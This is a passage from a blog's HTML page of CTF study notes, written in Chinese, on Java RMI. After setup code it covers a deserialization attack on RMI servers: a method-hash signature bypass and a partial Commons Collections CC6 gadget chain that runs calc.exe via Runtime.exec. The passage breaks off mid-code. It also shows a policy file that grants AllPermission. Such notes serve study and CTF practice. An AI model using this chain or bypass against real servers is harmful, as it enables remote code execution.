@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"qst137.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="添砖 Java 壹该学点正经东西了，开始视奸学长博客，哈哈； RMI学习一下 RMI 的配置： Server接口 12345public interface RemoteInterface extends Remote &#123;	public String sayHello() throws RemoteException;	public String sayHello(Object name">
+<meta property="og:type" content="article">
+<meta property="og:title" content="添砖 Java 壹">
+<meta property="og:url" content="https://qst137.github.io/2024/09/18/2024-09-18-%E6%B7%BB%E7%A0%96%20Java%20%E5%A3%B9/index.html">
+<meta property="og:site_name" content="QST2&#39;s BLOG">
+<meta property="og:description" content="添砖 Java 壹该学点正经东西了，开始视奸学长博客，哈哈； RMI学习一下 RMI 的配置： Server接口 12345public interface RemoteInterface extends Remote &#123;	public String sayHello() throws RemoteException;	public String sayHello(Object name">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/NM9bXMF.png">
+<meta property="article:published_time" content="2024-09-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-18T22:33:35.717Z">
+<meta property="article:author" content="QST137">
+<meta property="article:tag" content="CTF-Java">
+<meta property="article:tag" content="CTF-web">
+<meta property="article:tag" content="RMI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/NM9bXMF.png">
+
+<link rel="canonical" href="https://qst137.github.io/2024/09/18/2024-09-18-%E6%B7%BB%E7%A0%96%20Java%20%E5%A3%B9/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>添砖 Java 壹 | QST2's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">QST2's BLOG</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Version: WwJ</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/18/2024-09-18-%E6%B7%BB%E7%A0%96%20Java%20%E5%A3%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="QST137">
+      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="QST2's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          添砖 Java 壹
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-18T00:00:00+08:00">2024-09-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-09-19 06:33:35" itemprop="dateModified" datetime="2024-09-19T06:33:35+08:00">2024-09-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="添砖-Java-壹"><a href="#添砖-Java-壹" class="headerlink" title="添砖 Java 壹"></a>添砖 Java 壹</h1><p>该学点正经东西了，开始视奸学长博客，哈哈；</p>
+<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>学习一下 RMI 的配置：</p>
+<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><strong>接口</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayGoodbye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>调用类</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inherit UnicastRemoteObject to export the remote class automatically</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="title function_">RemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Hello My Friend&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">		<span class="keyword">return</span> name.getClass().getName();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> String <span class="title function_">sayGoodbye</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;Bye&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建注册中心，绑定端口</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">    		<span class="comment">// start server</span></span><br><span class="line">    		LocateRegistry.createRegistry(PORT);</span><br><span class="line">    		<span class="comment">// bind object to port</span></span><br><span class="line">    		<span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> mew <span class="title function_">RemoteObject</span><span class="params">()</span>;</span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/RemoteObject&quot;</span>, remoteObject);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    		e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p><strong>调用接口</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="comment">// link registry</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(RMI_SERVER_IP, PORT);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line">        <span class="comment">// lookup by name</span></span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteInterface) registry.lookup(<span class="string">&quot;RemoteObject&quot;</span>);</span><br><span class="line">        System.out.println(stub.sayHello());</span><br><span class="line">        System.out.println(stub.sayGoodbye());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, URL);</span><br><span class="line"><span class="comment">// same as startup params [-Djava.rmi.server.codebase=&quot;&#123;URL&#125;&quot;]</span></span><br></pre></td></tr></table></figure>
+
+<p>Client 调用的对象 <code>RemoteObject</code>如果在 Server 不存在，如果 Server 有设置 <code>java.rmi.server.codebase</code> ，则会从 <code>URL</code> 寻找字节码 <code>RemoteObject.class</code>；</p>
+<h4 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="安全策略-1"><a href="#安全策略-1" class="headerlink" title="安全策略"></a>安全策略</h4><p>策略文件默认为：<code>$JAVA_HOME/jre/lib/security/java.policy</code>：</p>
+<p>自定义策略文件 <strong>rmi.policy</strong>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设置管理器：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// same as startup params [-Djava.security.manager]</span></span><br></pre></td></tr></table></figure>
+
+<p>指定策略：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RemoteServer.class.getClassLoader().getResource(<span class="string">&quot;rmi.policy&quot;</span>).toString());</span><br><span class="line"><span class="comment">// same as startup params [-Djava.security.policy=rmi.policy]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Server-Attack"><a href="#Server-Attack" class="headerlink" title="Server Attack"></a>Server Attack</h3><h4 id="evil-params"><a href="#evil-params" class="headerlink" title="evil params"></a>evil params</h4><p>Client 端传 Object 对象给 Server，可以触发反序列化；</p>
+<p>示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// interface</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIClass</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object o)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// attacked server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OBJECT_URL</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Hello&quot;</span>;</span><br><span class="line">    <span class="comment">//    private static final String CODEBASE_URL = &quot;http://127.0.0.1:9999/&quot;;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">POLICY_FILE</span> <span class="operator">=</span> <span class="string">&quot;rmi.policy&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVER_START_MESSAGE</span> <span class="operator">=</span> <span class="string">&quot;SERVER STARTED&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, AlreadyBoundException, RemoteException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, CODEBASE_URL);</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RMIServer.class.getClassLoader().getResource(POLICY_FILE).toString());</span><br><span class="line">        LocateRegistry.createRegistry(REGISTRY_PORT);</span><br><span class="line">        <span class="type">RMIClass</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIClassImpl</span>();</span><br><span class="line">        Naming.bind(OBJECT_URL, remoteObject);</span><br><span class="line">        System.out.println(SERVER_START_MESSAGE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// attack client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BINDED_NAME</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">IP</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(IP, PORT);</span><br><span class="line">        <span class="type">RMIClass</span> <span class="variable">stub</span> <span class="operator">=</span> (RMIClass) registry.lookup(BINDED_NAME);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line"><span class="comment">//        System.out.println(stub.sayHello());</span></span><br><span class="line">        System.out.println(stub.sayHello(getPayload()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// CC6 excute &quot;calc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>CS 分别运行，弹计算器；</p>
+<p>另外不难想到，只要 Server 端接收非基本类型，都会触发反序列化，这里有一个问题：</p>
+<p>如果 Server 接收和 Client 发送的类型签名不一致，会抛出一个错误，如果将 Server 端的 <code>RMIClass</code> 接口改为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIClass</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Integer i)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>报错如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// remoteException occurred in server thread; nested exception is: </span></span><br><span class="line"><span class="comment">// 	java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object</span></span><br></pre></td></tr></table></figure>
+
+<p>在远程对象上找不到对应签名的方法所致，在 <code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code> 下一下断点：</p>
+<p>里面有这样一段：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> ref.invoke((Remote) proxy, method, args, getMethodHash(method));</span><br></pre></td></tr></table></figure>
+
+<p>这里进行远程调用，事实上 <code>getMethodHash</code> 是用来定位方法的，而且 Client 可以被攻击者完全控制，因此使用 hook 在这里把被 hash 的 <code>method</code> 改为和远程对象一致的方法即可绕过对签名的检验；</p>
+<p>首先在 Client 端的 <code>RMIClass</code> 接口加上目标函数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIClass</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Integer i)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>断点处栈的状况：</p>
+<p><img src="https://i.imgur.com/NM9bXMF.png"></p>
+<p>将 <code>method</code> 改为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIClass.class.getMethod(<span class="string">&quot;sayHello&quot;</span>, Integer.class)</span><br></pre></td></tr></table></figure>
+
+<p>即可绕过校验触发反序列化，弹出计算器；</p>
+<p>故而只要有传非基本类型参数的函数，Server 端都可以反序列化任意 payload，这一层相当于通杀了；</p>
+<p>看到这了重新学一下 CC6；</p>
+<h3 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// RCE transformer chain</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class, <span class="literal">null</span>&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                    <span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;</span><br><span class="line">            )</span><br><span class="line">    &#125;;</span><br><span class="line">		</span><br><span class="line">    <span class="comment">// put fake transformers</span></span><br><span class="line">    <span class="comment">// use reflection instead of &quot;put&quot; method to avoid unexpected serialization</span></span><br><span class="line">    Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    